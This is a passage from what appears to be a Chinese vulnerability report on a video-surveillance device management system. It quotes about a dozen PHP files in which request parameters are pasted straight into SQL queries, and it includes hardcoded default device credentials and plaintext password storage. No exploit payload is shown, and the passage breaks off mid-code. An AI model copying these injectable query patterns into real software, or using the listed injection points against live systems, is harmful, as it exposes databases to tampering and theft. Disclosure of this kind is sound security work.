if($type==\"singleCode\"){//如果是单编号设备添加\t\t$singleCode_indexcode=$_POST['singleCode_indexcode'];\t\tcheckSingleCode($dbQuery,$singleCode_indexcode);\t}else{//如果是编号段设备添加\t\t$codeDomain_preIndexCode=$_POST['codeDomain_preIndexCode'];\t\t$codeDomain_startCode=$_POST['codeDomain_startCode'];\t\t$codeDomain_endCode=$_POST['codeDomain_endCode'];\t\tcheckCodeDomain($dbQuery,$codeDomain_preIndexCode,$codeDomain_startCode,$codeDomain_endCode);\t}\tfunction checkSingleIp($dbQuery,$singleIp_addr,$singleIp_port){\t\t$count = $dbQuery->querySingle('select count(*) from device_info where network_addr=\"'.$singleIp_addr.'\" and network_port='.$singleIp_port);\t\techo $count;\t\t$dbQuery->closeDb();\t}\n第二十三处：/data/deviceListData.php\n<?php\t\t\tinclude('../common/connDb.php');\t\tinclude('../common/unitCode.php');\t\t$dbQuery = new DataBaseQuery();\t\t$page=$_POST['page']; \t\t$rows=$_POST['rows'];\t\t$sort=$_POST['sort'];\t\t$order=$_POST['order'];\t\t\t$start=($page -1)*$rows;\t\t$name=@$_POST['name'];\t\t$organize=@$_POST['organize'];\t\t$group=@$_POST['group'];\t\t$whereStr=\"\";\t\tif($name != \"\"){\t\t\tif($name==\".\" || $name==\"%\" || $name==\"_\"){\t\t\t\t$name =\"[\".$name.\"]\";\t\t\t}\t\t\t$whereStr =\" and (d.name like '%\".$name.\"%' or **.**.**.**work_addr like '%\".$name.\"%')\";\t\t}\t\tif($organize != \"\"){\t\t\tif($organize ==\"0\"){ //如果是主控制中心则查询全部\t\t\t}else{\t\t\t\tif(strlen($organize)==8){//如果是派出所级别\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$organize.\"%' and d.ctrl_unit_id<>1\";\t\t\t\t}else{\t\t\t\t\t$qxCode = substr($organize,4,2);\t\t\t\t\t$shiCode = substr($organize,2,2);\t\t\t\t\t$shengCode = substr($organize,0,2);\t\t\t\t\tif($shiCode==\"00\" && $qxCode==\"00\"){  //如果是省\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$shengCode.\"%' and d.ctrl_unit_id<>1\";\t\t\t\t\t}else if($shiCode !=\"00\" && $qxCode==\"00\"){  //如果是市\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$shengCode.$shiCode.\"%' and d.ctrl_unit_id<>1\";\t\t\t\t\t}else{\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$organize.\"%' and d.ctrl_unit_id<>1\";\t\t\t\t\t}\t\t\t\t}\t\t\t\t\t\t\t}\t\t\t}\t\tif($group != \"\"){\t\t\tif($group==\"-1\"){\t\t\t}else{\t\t\t\t$whereStr =\" and d.group_id =\".$group;\t\t\t}\t\t\t}\t\t$re = $dbQuery->query('select d.id,d.indexcode,d.dev_guid devGuid,d.name,(select name from device_type_info where type_code = d.type_code) deviceType,d.reg_type,**.**.**.**work_addr,**.**.**.**work_port,d.analog_chan_count,d.digital_chan_count,d.alarm_in_count,d.alarm_out_count,(select name from device_group_info where id=d.group_id) groupName,d.status,d.type_code typeCode from device_info d where 1=1 '.$unitWhere.$whereStr.' order by '.$sort.' '.$order.' limit '.$start.','.$rows);\t\t//echo 'select d.id,d.indexcode,d.dev_guid devGuid,d.name,(select name from device_type_info where type_code = d.type_code) deviceType,d.reg_type,**.**.**.**work_addr,**.**.**.**work_port,d.analog_chan_count,d.digital_chan_count,d.alarm_in_count,d.alarm_out_count,(select name from device_group_info where id=d.group_id) groupName,d.status,d.type_code typeCode from device_info d where 1=1 '.$unitWhere.$whereStr.' order by '.$sort.' '.$order.' limit '.$start.','.$rows;\t\t$count = $dbQuery->querySingle('select count(*) from device_info d where 1=1'.$unitWhere.$whereStr);\t\t$jsonStr =\"\";\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t$jsonStr = $jsonStr.json_encode($row).\",\";\t\t}\t\tif($jsonStr !=\"\"){\t\t\t$jsonStr = substr($jsonStr,0,strlen($jsonStr)-1);\t\t}\t\t$str ='{\"total\":'.$count.',\"rows\":['.$jsonStr.']}';\t\t$dbQuery->closeDb();\t\techo ($str);?>\n第二十四处：/data/saveUserInfo.php\n<?phpinclude('../common/connDb.php');$operate=$_POST['operate'];if($operate==\"delete\"){  //如果是删除操作\t$userIds = $_POST['userIds'];\tdeleteUserInfo($userIds);}else{  //如果是增加或者修改操作\t$isEmpty=empty($_POST['userId']);\t$name=$_POST['name'];\t$password = $_POST['password'];\t$password_old = @$_POST['password_old'];\t$realName = $_POST['realName'];\t$phone = $_POST['phone'];\t$eMail = $_POST['eMail'];\t$roleId = $_POST['roleId'];\t$unitCode = $_POST['unitCode'];\tif($isEmpty){\t\tsaveUserInfo($name,$password,$realName,$phone,$eMail,$roleId,$unitCode);\t}else{\t\tupdateUserInfo($_POST['userId'],$name,$password,$realName,$phone,$eMail,$roleId,$unitCode);\t}\t}function deleteUserInfo($userIds){\t\t$dbQuery = new DataBaseQuery();\t\t$query = $dbQuery->execute(\"delete from user_info where userId in(\".$userIds.\")\");\t\tif ($query) {\t\t\techo \"0\";\t\t}else{\t\t\techo \"1\";\t\t}\t\t$dbQuery->closeDb();}function saveUserInfo($name,$password,$realName,$phone,$eMail,$roleId,$unitCode){\t\t$dbQuery = new DataBaseQuery();\t\tdate_default_timezone_set('PRC');\t\t$time = date('Y-m-d H:i:s',time());\t\tif($password != $password_old){\t\t\t$query = $dbQuery->execute('insert into user_info values (NULL,\"'.$name.'\",\"'.$password.'\",\"'.$unitCode.'\",\"'.$realName.'\",\"'.$phone.'\",\"'.$eMail.'\",'.$roleId.',\"'.$time.'\",\"1\")');\t\t}\t\telse{\t\t\t$query = $dbQuery->execute('insert into user_info values (NULL,\"'.$name.'\",\"\",\"'.$unitCode.'\",\"'.$realName.'\",\"'.$phone.'\",\"'.$eMail.'\",'.$roleId.',\"'.$time.'\",\"1\")');\t\t}\t\tif ($query) {\t\t\techo $dbQuery->lastInsertRowID();\t\t}else{\t\t\techo 0;\t\t}\t\t$dbQuery->closeDb();\t\t}function updateUserInfo($userId,$name,$password,$realName,$phone,$eMail,$roleId,$unitCode){\t\t$dbQuery = new DataBaseQuery();\t\tdate_default_timezone_set('PRC');\t\t$time = date('Y-m-d H:i:s',time());\t\tif($password != $password_old){\t\t\t$query = $dbQuery->execute('update user_info set name=\"'.$name.'\",password=\"'.$password.'\",unitCode=\"'.$unitCode.'\",realName=\"'.$realName.'\",phone=\"'.$phone.'\",eMail=\"'.$eMail.'\",roleId='.$roleId.',updataTime=\"'.$time.'\" where userId='.$userId);\t\t}\t\telse{\t\t\t$query = $dbQuery->execute('update user_info set name=\"'.$name.'\",unitCode=\"'.$unitCode.'\",realName=\"'.$realName.'\",phone=\"'.$phone.'\",eMail=\"'.$eMail.'\",roleId='.$roleId.',updataTime=\"'.$time.'\" where userId='.$userId);\t\t}\t\tif ($query) {\t\t\techo $userId;\t\t}else{\t\t\techo 0;\t\t}\t\t$dbQuery->closeDb();}?>\n第二十五处：/data/fetchCameraInfo.php\n<?php\t\t\tinclude('../common/connDb.php');\t\tinclude('../common/unitCode.php');\t\t$dbQuery = new DataBaseQuery();\t\t$page=$_POST['page']; \t\t$rows=$_POST['rows'];\t\t$sort=$_POST['sort'];\t\t$order=$_POST['order'];\t\t\t$start=($page -1)*$rows;\t\t$name=@$_POST['name'];\t\t$organize=@$_POST['organize'];\t\t$group=@$_POST['group'];\t\t$configFlag=@$_POST['configFlag'];\t\t$whereStr=\"\";\t\tif($name != \"\"){\t\t\tif($name==\".\" || $name==\"%\" || $name==\"_\"){\t\t\t\t$name =\"[\".$name.\"]\";\t\t\t}\t\t\t$whereStr =\" and (d.name like '%\".$name.\"%' or **.**.**.**work_addr like '%\".$name.\"%' or c.name like '%\".$name.\"%')\";\t\t}\t\tif($organize != \"\"){\t\t\tif($organize ==\"0\"){ //如果是主控制中心则查询全部\t\t\t}else{\t\t\t\tif(strlen($organize)==8){//如果是派出所级别\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$organize.\"%' and d.ctrl_unit_id<>1\";\t\t\t\t}else{\t\t\t\t\t$qxCode = substr($organize,4,2);\t\t\t\t\t$shiCode = substr($organize,2,2);\t\t\t\t\t$shengCode = substr($organize,0,2);\t\t\t\t\tif($shiCode==\"00\" && $qxCode==\"00\"){  //如果是省\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$shengCode.\"%' and d.ctrl_unit_id<>1\";\t\t\t\t\t}else if($shiCode !=\"00\" && $qxCode==\"00\"){  //如果是市\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$shengCode.$shiCode.\"%' and d.ctrl_unit_id<>1\";\t\t\t\t\t}else{\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$organize.\"%' and d.ctrl_unit_id<>1\";\t\t\t\t\t}\t\t\t\t}\t\t\t\t\t\t\t}\t\t\t}\t\tif($group != \"\"){\t\t\tif($group==\"-1\"){\t\t\t}else{\t\t\t\t$whereStr =\" and d.group_id =\".$group;\t\t\t}\t\t\t}\t\tif($configFlag == \"1\"){\t\t\t$whereStr =\" and (c.is_transform is null or c.is_transform=0)\";\t\t}else if($configFlag == \"2\"){\t\t\t$whereStr =\" and (c.is_stream_transmit is null or c.is_stream_transmit=0)\";\t\t}\t\t$re = $dbQuery->query('select c.id,c.name,c.indexcode,d.name deviceName,**.**.**.**work_addr networkAddr,**.**.**.**work_port networkPort,c.is_transform transform,c.is_stream_transmit streamTransmit,d.status,d.id deviceId,c.local_num num,d.reg_type regType,d.indexcode devIndexCode,d.type_code typeCode,d.username,d.password,d.id deviceId from camera_info c,device_info d where c.device_indexcode=d.indexcode'.$unitWhere.$whereStr.' order by d.id '.$order.' limit '.$start.','.$rows);\t\t$count = $dbQuery->querySingle('select count(*) from camera_info c,device_info d where c.device_indexcode=d.indexcode'.$unitWhere.$whereStr);\t\t$jsonStr =\"\";\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t$jsonStr = $jsonStr.json_encode($row).\",\";\t\t}\t\tif($jsonStr !=\"\"){\t\t\t$jsonStr = substr($jsonStr,0,strlen($jsonStr)-1);\t\t}\t\t$str ='{\"total\":'.$count.',\"rows\":['.$jsonStr.']}';\t\t$dbQuery->closeDb();\t\techo ($str);?>\n第二十六处：/data/fetchDeviceType.php\n<?php\t\t\t/*\t\t\t根据typeCode找出设备类型\t\t*/\t\tinclude('../common/connDb.php');\t\t$dbQuery = new DataBaseQuery();\t\t$typeCode=$_POST['typeCode'];\t\t$typeCodeArray = $dbQuery->querySingleRow('select type_code typeCode,name,manufacturer,register_type registerType,access_type accessType,equipment_type equipmentType,plugin_id pluginId,int_rev port,str_rev cName from device_type_info where type_code='.$typeCode,true);\t\t$dbQuery->closeDb();\t\techo(json_encode($typeCodeArray));?>\n第二十七处：/data/saveGroup.php\n<?phpinclude('../common/connDb.php');$operate=$_POST['operate'];$groupIds = @$_POST['groupIds'];$groupId= @$_POST['groupId'];$name= @$_POST['name'];if($operate==\"delete\"){  //如果是删除操作\tdeleteGroup($groupIds);}else if($operate==\"add\"){ //如果是增加操作\tsaveGroup($name);}else{  //如果是修改操作\tupdateGroup($groupId,$name);}function deleteGroup($groupIds){\t\t$dbQuery = new DataBaseQuery();\t\t$query1 = $dbQuery->execute(\"update device_info set group_id=0 where group_id in(\".$groupIds.\")\");\t\t$query2 = $dbQuery->execute(\"delete from device_group_info where id in(\".$groupIds.\")\");\t\tif ($query1 && $query2) {\t\t\techo \"0\";\t\t}else{\t\t\techo \"1\";\t\t}\t\t$dbQuery->closeDb();}function saveGroup($name){\t\t$dbQuery = new DataBaseQuery();\t\tdate_default_timezone_set('PRC');\t\t$time = date('Y-m-d H:i:s',time());\t\t$query = $dbQuery->execute('insert into device_group_info values(NULL,\"'.$name.'\",\"'.$time.'\",0,\"\")');\t\tif ($query) {\t\t\techo $dbQuery->lastInsertRowID();\t\t}else{\t\t\techo 0;\t\t}\t\t$dbQuery->closeDb();\t\t}function updateGroup($groupId,$name){\t\t$dbQuery = new DataBaseQuery();\t\tdate_default_timezone_set('PRC');\t\t$time = date('Y-m-d H:i:s',time());\t\t$query = $dbQuery->execute('update device_group_info set name=\"'.$name.'\",update_time=\"'.$time.'\" where id='.$groupId);\t\tif ($query) {\t\t\techo $groupId;\t\t}else{\t\t\techo 0;\t\t}\t\t$dbQuery->closeDb();}?>\n第二十八处：/data/saveRoleInfo.php\n<?phpinclude('../common/connDb.php');$operate=$_POST['operate'];if($operate==\"delete\"){  //如果是删除操作\t$roleIds = $_POST['roleIds'];\tdeleteRoleInfo($roleIds);}else{  //如果是增加或者修改操作\t$isEmpty=empty($_POST['roleId']);\t$name=$_POST['name'];\t$description = $_POST['description'];\t$menuIds = $_POST['menuIds'];\tif($isEmpty){\t\tsaveRoleInfo($name,$description,$menuIds);\t}else{\t\tupdateRoleInfo($_POST['roleId'],$name,$description,$menuIds);\t}\t}function deleteRoleInfo($roleIds){\t\t$dbQuery = new DataBaseQuery();\t\t$query1 = $dbQuery->execute(\"delete from user_info where roleId in(\".$roleIds.\")\");//先删除关联该角色的用户\t\t$query2 = $dbQuery->execute(\"delete from role_info where roleId in(\".$roleIds.\")\");//再删除角色\t\tif ($query1 && $query2) {\t\t\techo \"0\";\t\t}else{\t\t\techo \"1\";\t\t}\t\t$dbQuery->closeDb();}function saveRoleInfo($name,$description,$menuIds){\t\t$dbQuery = new DataBaseQuery();\t\tdate_default_timezone_set('PRC');\t\t$time = date('Y-m-d H:i:s',time());\t\t$query = $dbQuery->execute('insert into role_info values (NULL,\"'.$name.'\",\"'.$description.'\",\"'.$menuIds.'\",\"'.$time.'\",\"\")');\t\tif ($query) {\t\t\techo $dbQuery->lastInsertRowID();\t\t}else{\t\t\techo 0;\t\t}\t\t$dbQuery->closeDb();\t\t}function updateRoleInfo($roleId,$name,$description,$menuIds){\t\t$dbQuery = new DataBaseQuery();\t\tdate_default_timezone_set('PRC');\t\t$time = date('Y-m-d H:i:s',time());\t\t$query = $dbQuery->execute('update role_info set name=\"'.$name.'\",description=\"'.$description.'\",menuIds=\"'.$menuIds.'\",updataTime=\"'.$time.'\" where roleId='.$roleId);\t\tif ($query) {\t\t\techo $roleId;\t\t}else{\t\t\techo 0;\t\t}\t\t$dbQuery->closeDb();}?>\n第二十九处：/data/roleInfoData.php\n<?php\t\t\tinclude('../common/connDb.php');\t\t$dbQuery = new DataBaseQuery();\t\t$page=$_POST['page']; \t\t$rows=$_POST['rows'];\t\t$start=($page -1)*$rows;\t\t$re = $dbQuery->query('select * from role_info limit '.$start.','.$rows);\t\t$count = $dbQuery->querySingle('select count(*) from role_info');\t\t$jsonStr =\"\";\t\twhile ($row = $dbQuery->fetchArray($re)){\t\t\t$jsonStr = $jsonStr.json_encode($row).\",\";\t\t}\t\tif($jsonStr !=\"\"){\t\t\t$jsonStr = substr($jsonStr,0,strlen($jsonStr)-1);\t\t}\t\t$str ='{\"total\":'.$count.',\"rows\":['.$jsonStr.']}';\t\t$dbQuery->closeDb();\t\techo ($str);?>\n第三十处：/data/shareDeviceInfo.php\n<?php\tinclude('../common/connDb.php');\t$operate = $_POST['operate'];\t$deviceIds = @$_POST['deviceIds'];\t$unitId = @$_POST['unitId'];\t$groupId = @$_POST['groupId'];\t$dbQuery = new DataBaseQuery();\tif($operate==\"share\"){  //如果是指定勾选共享\t\tshareDeviceInfo($dbQuery,$deviceIds,$unitId);\t}else{  //如果是全部共享\t\tshareAllDeviceInfo($dbQuery,$groupId,$unitId);\t}\t$dbQuery->closeDb();\tfunction shareDeviceInfo($dbQuery,$deviceIds,$unitId){\t\t\t$query = $dbQuery->execute('update device_info set ctrl_unit_id='.$unitId.' where id in('.$deviceIds.')');\t\t\tif ($query) {\t\t\t\techo 0;\t\t\t}else{\t\t\t\techo 1;\t\t\t}\t}\tfunction shareAllDeviceInfo($dbQuery,$groupId,$unitId){\t\t$query = $dbQuery->execute('update device_info set ctrl_unit_id='.$unitId.' where group_id ='.$groupId);\t\tif ($query) {\t\t\techo 0;\t\t}else{\t\t\techo 1;\t\t}\t}?>\n第三十一处：/data/modifyCameraName.php\n<?php\tinclude('../common/connDb.php');\t$deviceId=$_POST['deviceId'];\t$channelNum=$_POST['channelNum'];\t$cameraName=$_POST['cameraName'];\t$dbQuery = new DataBaseQuery();\t$dbQuery->execute('update camera_info set name=\"'.$cameraName.'\" where device_id='.$deviceId.' and local_num ='.$channelNum);\t$dbQuery->closeDb();\techo \"0\";?>\n第三十二处：/data/saveDeviceInfo.php\n<?phpinclude('../common/connDb.php');$obj=$_POST['obj'];$analog_chan_count = $_POST['analog_chan_count'];$digital_chan_count = $_POST['digital_chan_count'];$alarm_in_count = $_POST['alarm_in_count'];$alarm_out_count = $_POST['alarm_out_count'];$audio_num = $_POST['audio_num'];$dbQuery = new DataBaseQuery();$xml = simplexml_load_file('../../../pagconf.xml');$pagIndexCode = $xml->pag->indexCode;if($obj==\"singleIp\"){  //如果是单IP添加\t$singleIp_addr = $_POST['singleIp_addr'];\t$singleIp_port = $_POST['singleIp_port'];\t$singleIp_username = $_POST['singleIp_username'];\t$singleIp_password = $_POST['singleIp_password'];\t$singleIp_typecode = $_POST['singleIp_typecode'];\t$singleIp_groupId = $_POST['singleIp_groupId'];\t$singleIp_controlUnit = $_POST['singleIp_controlUnit'];\t$singleIp_indexcode = getIndexCode($dbQuery,$singleIp_controlUnit);\t$name = $_POST['name'];\tif($name==\"\"){\t\t$name = $singleIp_addr;\t}\t$serialnum = $_POST['serialnum'];\t$singleIp_allowShare = $_POST['singleIp_allowShare'];\t$reg_type = 0;  //注册类型-0 被动\t$deviceId = saveDeviceInfo($dbQuery,$singleIp_addr,$singleIp_port,$singleIp_username,$singleIp_password,$singleIp_typecode,$singleIp_indexcode,$name,$serialnum,$analog_chan_count,$digital_chan_count,$alarm_in_count,$alarm_out_count,$audio_num,$reg_type,$pagIndexCode,$singleIp_groupId,$singleIp_allowShare,$singleIp_controlUnit);\techo $singleIp_indexcode;}else if($obj==\"ipDomain\"){ //如果是IP段添加\t$ipDomain_startIp = $_POST['ipDomain_startIp'];\t$ipDomain_endIp = $_POST['ipDomain_endIp'];\t$ipDomain_typecode = $_POST['ipDomain_typecode'];\t$ipDomain_port = $_POST['ipDomain_port'];\t$ipDomain_username = $_POST['ipDomain_username'];\t$ipDomain_password = $_POST['ipDomain_password'];\t$ipDomain_groupId = $_POST['ipDomain_groupId'];\t$ipDomain_controlUnit = $_POST['ipDomain_controlUnit'];\t$ipDomain_allowShare = $_POST['ipDomain_allowShare'];\t$reg_type = 0;  //注册类型-0 被动\t$deviceIndexCodes =\"\";\t$ipArray = ipMiddle($ipDomain_startIp,$ipDomain_endIp);\tfor($i=0;$i<count($ipArray);$i++){\t\t$newIndexCode = getIndexCode($dbQuery,$ipDomain_controlUnit);\t\t$deviceId = saveDeviceInfo($dbQuery,$ipArray[$i],$ipDomain_port,$ipDomain_username,$ipDomain_password,$ipDomain_typecode,$newIndexCode,$ipArray[$i],\"\",$analog_chan_count,$digital_chan_count,$alarm_in_count,$alarm_out_count,$audio_num,$reg_type,$pagIndexCode,$ipDomain_groupId,$ipDomain_allowShare,$ipDomain_controlUnit);\t\tif($i==0){\t\t\t$deviceIndexCodes = $newIndexCode;\t\t}else{\t\t\t$deviceIndexCodes = $deviceIndexCodes.\",\".$newIndexCode;\t\t}\t\t\t}\techo $deviceIndexCodes;}else if($obj==\"singleCode\"){ //如果是单编号添加\t$singleCode_typecode = $_POST['singleCode_typecode'];\t$singleCode_indexcode = $_POST['singleCode_indexcode'];\t$singleCode_groupId = $_POST['singleCode_groupId'];\t$singleCode_controlUnit = $_POST['singleCode_controlUnit'];\t$name = $_POST['name'];\tif($name==\"\"){\t\t$name = \"DEVICE_\".$singleCode_indexcode;\t}\t$serialnum = $_POST['serialnum'];\t$singleCode_allowShare = $_POST['singleCode_allowShare'];\t$reg_type = 4;  //注册类型-0 主动\t$deviceId = saveDeviceInfo($dbQuery,\"**.**.**.**\",8000,\"admin\",\"12345\",$singleCode_typecode,$singleCode_indexcode,$name,$serialnum,$analog_chan_count,$digital_chan_count,$alarm_in_count,$alarm_out_count,$audio_num,$reg_type,$pagIndexCode,$singleCode_groupId,$singleCode_allowShare,$singleCode_controlUnit);\techo $singleCode_indexcode;}else{ //如果是编号段添加\t$codeDomain_typecode = $_POST['codeDomain_typecode'];\t$codeDomain_preIndexCode = $_POST['codeDomain_preIndexCode'];\t$codeDomain_startCode = $_POST['codeDomain_startCode'];\t$codeDomain_endCode = $_POST['codeDomain_endCode'];\t$codeDomain_groupId = $_POST['codeDomain_groupId'];\t$codeDomain_allowShare = $_POST['codeDomain_allowShare'];\t$codeDomain_controlUnit = $_POST['codeDomain_controlUnit'];\t\t$reg_type = 4;  //注册类型-0 主动\t$deviceIndexCodes =\"\";\t$codeDomain_CodeLength = strlen($codeDomain_endCode);\t$indexCodeArray = generateSegmentIndexCode($codeDomain_preIndexCode,intval($codeDomain_startCode),intval($codeDomain_endCode), $codeDomain_CodeLength);\tfor($i=0;$i<count($indexCodeArray);$i++){\t\t$name = \"DEVICE_\".$indexCodeArray[$i];\t\t$deviceId = saveDeviceInfo($dbQuery,\"**.**.**.**\",8000,\"admin\",\"12345\",$codeDomain_typecode,$indexCodeArray[$i],$name,\"\",$analog_chan_count,$digital_chan_count,$alarm_in_count,$alarm_out_count,$audio_num,$reg_type,$pagIndexCode,$codeDomain_groupId,$codeDomain_allowShare,$codeDomain_controlUnit);\t\tif($i==0){\t\t\t$deviceIndexCodes = $indexCodeArray[$i];\t\t}else{\t\t\t$deviceIndexCodes = $deviceIndexCodes.\",\".$indexCodeArray[$i];\t\t}\t\t\t}\techo $deviceIndexCodes;}$dbQuery->closeDb();function saveDeviceInfo($dbQuery,$addr,$port,$username,$password,$typecode,$indexcode,$name,$serialnum,$analog_chan_count,$digital_chan_count,$alarm_in_count,$alarm_out_count,$audio_num,$reg_type,$pagIndexCode,$groupId,$allowShare,$singleIp_controlUnit){\t\t$seq = $dbQuery->querySingle('select seq from sqlite_sequence where name=\"device_info\"');\t\t$str=\"\";\t\tif($seq==null || $seq==\"\"){\t\t\t$str = \"1\";\t\t}else{\t\t\t$str = strval($seq+1);\t\t}\t\twhile(strlen($str)<12){\t\t\t$str=\"0\".$str;\t\t}\t\t$dev_guid=$pagIndexCode.$str;\t\tdate_default_timezone_set('PRC');\t\t$time = date('Y-m-d H:i:s',time());\t\t$ctrl_unit_id = \"\";\t\tif($singleIp_controlUnit==\"0\"){\t\t\t$ctrl_unit_id = \"1\";\t\t}else{\t\t\t$ctrl_unit_id = \"0\";\t\t}\t\t$query = $dbQuery->execute('insert into device_info(id,dev_guid,indexcode,name,type_code,reg_type,network_addr,network_port,username,password,group_id,serial_num,alarm_in_count,alarm_out_count,analog_chan_count,digital_chan_count,audio_num,update_time,allow_share,ctrl_unit_id) values (NULL,\"'.$dev_guid.'\",\"'.$indexcode.'\",\"'.$name.'\",'.$typecode.','.$reg_type.',\"'.$addr.'\",'.$port.',\"'.$username.'\",\"'.$password.'\",'.$groupId.',\"'.$serialnum.'\",'.$alarm_in_count.','.$alarm_out_count.','.$analog_chan_count.','.$digital_chan_count.','.$audio_num.',\"'.$time.'\",'.$allowShare.','.$ctrl_unit_id.')');\t\tif ($query) {\t\t\treturn $dbQuery->lastInsertRowID();\t\t}else{\t\t\treturn \"\";\t\t}\t\t}function ipMiddle($ipDomain_startIp,$ipDomain_endIp){\t$ipDomain_startIp = trim($ipDomain_startIp);\t$ipDomain_endIp = trim($ipDomain_endIp);\t$startIpArray = explode(\".\",$ipDomain_startIp);\t$endIpArray = explode(\".\",$ipDomain_endIp);\t$start0 = intval(trim($startIpArray[0]));\t$start1 = intval(trim($startIpArray[1]));\t$start2 = intval(trim($startIpArray[2]));\t$start3 = intval(trim($startIpArray[3]));\t$end0 = intval(trim($endIpArray[0]));\t$end1 = intval(trim($endIpArray[1]));\t$end2 = intval(trim($endIpArray[2]));\t$end3 = intval(trim($endIpArray[3]));\t$result = array();\t// 如果起始IP地址和结束IP地址不等\twhile(!($start0 == $end0 && $start1 == $end1 && $start2 == $end2 && $start3 == $end3)){\t\t$candidate = $start0.\".\".$start1.\".\".$start2.\".\".$start3;\t\t// 把起始地址放入数组中\t\tarray_push($result,$candidate);\t\t// 起始地址加1\t\t$start3 = $start3 + 1;\t\tif($start3 == 256){\t\t\t$start3 = 0;\t\t\t$start2 = $start2 + 1;\t\t\tif($start2 == 256){\t\t\t\t$start2 = 0;\t\t\t\t$start1 = $start1 + 1;\t\t\t\tif($start1 == 256){\t\t\t\t\t$start1 = 0;\t\t\t\t\t$start0 = $start0 + 1;\t\t\t\t}\t\t\t}\t\t}\t}\t// 如果退出循环，起始IP地址和结束IP地址相等\tarray_push($result,$ipDomain_endIp);\treturn $result;}function getIndexCode($dbQuery,$controlUnit){\t$preIndex=\"\";\t$xml = simplexml_load_file('../common/codeConfig.xml');\t$areaCode = strval($xml->areaCode);\t$netMark = strval($xml->netMark);\t$version = simplexml_load_file('../../../version.xml');\t$platformCode = strval($version->Code);\t$codeProtocol = strval($version->CodeProtocol);\t\t//DB33  GB28181\tif($controlUnit==\"0\"){\t\tdate_default_timezone_set('PRC');\t\t$controlUnit = date('ymd',time());\t}\tif($codeProtocol == 'DB33'){//18bit\t\tif(strlen($controlUnit)==8){\t\t\t$preIndex = $controlUnit.\"00\".$platformCode;\t\t}else{\t\t\t$preIndex = $controlUnit.\"0000\".$platformCode;\t\t}\t\t$indexCode=\"\";\t\t$existCount = 0;\t\tdo{\t\t\t$indexCode = $preIndex.getrndnum(4).\"00\";\t\t\t$existCount = $dbQuery->querySingle('select count(*) from device_info where indexcode=\"'.$indexCode.'\"');\t\t}while($existCount>0);\t\treturn $indexCode;\t}else{\t\tif(strlen($controlUnit)==8){\t\t\t$preIndex = $controlUnit.\"00\".$areaCode.$netMark.$platformCode;\t\t}else{\t\t\t$preIndex = $controlUnit.\"0000\".$areaCode.$netMark.$platformCode;\t\t}\t\t$indexCode=\"\";\t\t$existCount = 0;\t\tdo{\t\t\t$indexCode = $preIndex.getrndnum(4);\t\t\t$existCount = $dbQuery->querySingle('select count(*) from device_info where indexcode=\"'.$indexCode.'\"');\t\t}while($existCount>0);\t\treturn $indexCode;\t}\t}function getrndnum($length=6) {\t$hash = '';\t$chars = '0123456789';\t$max = strlen($chars) - 1;\tmt_srand((double)microtime() * 1000000);\tfor($i = 0; $i < $length; $i++){\t\t$hash .= $chars[mt_rand(0, $max)];\t}\treturn $hash;}function generateSegmentIndexCode($preIndexCode,$startIndexCode,$endIndexCode,$codeDomain_CodeLength){\t$indexCodeArray = array();\tif ($startIndexCode <= $endIndexCode) {\t\t$version = simplexml_load_file('../../../version.xml');\t\t$codeProtocol = strval($version->CodeProtocol);\t\t//DB33  GB28181\t\t$length = $codeDomain_CodeLength;//strlen(strval($endIndexCode));\t\tfor($i = $startIndexCode;$i<= $endIndexCode;$i++){\t\t\t$code = strval($i);\t\t\t$code = str_repeat(\"0\", $length-strlen($code)).$code;\t\t\t/*if($codeProtocol == 'DB33'){\t\t\t\tif(strlen($code)<6){\t\t\t\t\t$code = str_repeat(\"0\", 6-strlen($code)).$code;\t\t\t\t}\t\t\t}else{\t\t\t\tif(strlen($code)<4){\t\t\t\t\t$code = str_repeat(\"0\", 4-strlen($code)).$code;\t\t\t\t}\t\t\t}*/\t\t\t$code = $preIndexCode.$code;\t\t\tarray_push($indexCodeArray,$code);\t\t}\t}\treturn $indexCodeArray;}\n   漏洞证明：  第三十三处：/data/deviceAndCameraListData.php\ninclude('../common/connDb.php');\t\tinclude('../common/unitCode.php');\t\t$dbQuery = new DataBaseQuery();\t\t$page=$_POST['page']; \t\t$rows=$_POST['rows'];\t\t$sort=$_POST['sort'];\t\t$order=$_POST['order'];\t\t$start=($page -1)*$rows;\t\t$name=@$_POST['name'];\t\t$organize=@$_POST['organize'];\t\t$group=@$_POST['group'];\t\t$configFlag=@$_POST['configFlag'];\t\t$type=@$_GET['type'];\t\t$deviceIndexCode = @$_GET['deviceIndexCode'];\t\t$deviceId = @$_GET['deviceId'];\t\t$show = @$_GET['show'];\t\tif($type ==\"device\"){\t\t\t$whereStr=\"\";\t\t\tif($name != \"\"){\t\t\t\tif($name==\".\" || $name==\"%\" || $name==\"_\"){\t\t\t\t\t$name =\"[\".$name.\"]\";\t\t\t\t}\t\t\t\t$whereStr =\" and (d.name like '%\".$name.\"%' or **.**.**.**work_addr like '%\".$name.\"%')\";\t\t\t}\t\t\tif($organize != \"\"){\t\t\t\tif($organize ==\"0\"){ //如果是主控制中心则查询全部\t\t\t\t}else{\t\t\t\t\tif(strlen($organize)==8){//如果是派出所级别\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$organize.\"%'\";\t\t\t\t\t}else{\t\t\t\t\t\t$qxCode = substr($organize,4,2);\t\t\t\t\t\t$shiCode = substr($organize,2,2);\t\t\t\t\t\t$shengCode = substr($organize,0,2);\t\t\t\t\t\tif($shiCode==\"00\" && $qxCode==\"00\"){  //如果是省\t\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$shengCode.\"%'\";\t\t\t\t\t\t}else if($shiCode !=\"00\" && $qxCode==\"00\"){  //如果是市\t\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$shengCode.$shiCode.\"%'\";\t\t\t\t\t\t}else{\t\t\t\t\t\t\t$whereStr =\" and d.indexcode like '\".$organize.\"%'\";\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t\t\t\t\t\t}\t\t\t\t}\t\t\tif($group != \"\"){\t\t\t\tif($group==\"-1\"){\t\t\t\t}else{\t\t\t\t\t$whereStr =\" and d.group_id 